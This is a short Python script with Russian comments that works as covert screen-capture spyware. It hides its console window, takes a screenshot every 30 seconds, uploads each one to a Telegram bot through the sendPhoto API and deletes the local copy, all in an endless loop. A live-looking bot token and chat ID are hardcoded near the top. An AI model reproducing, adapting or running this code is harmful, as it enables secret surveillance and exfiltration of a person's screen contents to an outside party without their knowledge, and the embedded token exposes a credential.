import os
import pyautogui
import requests
from time import sleep
from datetime import datetime
import win32gui, win32con
window = win32gui.GetForegroundWindow()
win32gui.ShowWindow(window, win32con.SW_HIDE)
# ===== НАСТРОЙКИ ===== #
TELEGRAM_BOT_TOKEN = "7878980449:AAEe_BCyJa3HKMbEhbRoHwVlmYkBulgoDt8"  # Получить у @BotFather
TELEGRAM_CHAT_ID = "1594736864"  # Узнать через getUpdates
INTERVAL = 30  # Интервал между скриншотами (в секундах)


# ===================== #

def create_screenshot_folder():
    """Создает папку для скриншотов на рабочем столе"""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    folder = os.path.join(desktop, "Screenshots")
    os.makedirs(folder, exist_ok=True)
    return folder


def take_screenshot(folder):
    """Делает скриншот и возвращает путь к файлу"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(folder, f"screen_{timestamp}.png")
    pyautogui.screenshot(filename)
    return filename


def send_to_telegram(file_path):
    """Отправляет файл в Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(file_path, "rb") as file:
            files = {"photo": file}
            data = {"chat_id": TELEGRAM_CHAT_ID}
            response = requests.post(url, files=files, data=data)
        return response.status_code == 200
    except Exception as e:
        print(f"Ошибка отправки: {e}")
        return False


def clean_up(file_path):
    """Удаляет скриншот после отправки"""
    try:
        os.remove(file_path)
    except:
        pass


def main():
    folder = create_screenshot_folder()
    print(f"Скриншоты будут сохраняться в: {folder}")

    while True:
        try:
            # Создаем и отправляем скриншот
            screenshot = take_screenshot(folder)
            if send_to_telegram(screenshot):
                print(f"Скриншот отправлен: {screenshot}")
            clean_up(screenshot)

            # Ожидаем указанный интервал
            sleep(INTERVAL)

        except KeyboardInterrupt:
            print("Работа программы остановлена")
            break
        except Exception as e:
            print(f"Произошла ошибка: {e}")
            sleep(10)


if __name__ == "__main__":
    main()